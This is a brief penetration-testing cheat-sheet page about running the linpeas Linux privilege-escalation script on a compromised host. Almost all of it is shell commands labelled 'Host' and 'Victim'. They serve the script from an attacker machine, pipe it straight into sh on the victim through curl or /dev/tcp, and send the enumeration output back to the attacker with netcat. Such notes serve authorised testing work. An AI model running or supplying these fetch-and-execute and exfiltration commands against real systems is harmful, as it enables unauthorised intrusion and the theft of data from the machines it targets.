+++
title = "linpeas"
author = ["svejk"]
tags = ["linux", "privesc", "pentest", "enumeration"]
draft = false
+++

See carlospolop : [PEASS-ng](https://github.com/carlospolop/PEASS-ng)  [hacktricks](https://book.hacktricks.xyz/)


## Execution: {#execution}

Run from memory and send back to attacker:

```shell
# Local network
sudo python -m SimpleHTTPServer 80 #Host
curl 10.10.10.10/linpeas.sh | sh #Victim

# Without curl
sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
cat < /dev/tcp/10.10.10.10/80 | sh #Victim

# Excute from memory and send output back to the host
nc -lvnp 9002 | tee linpeas.out #Host
curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim
```
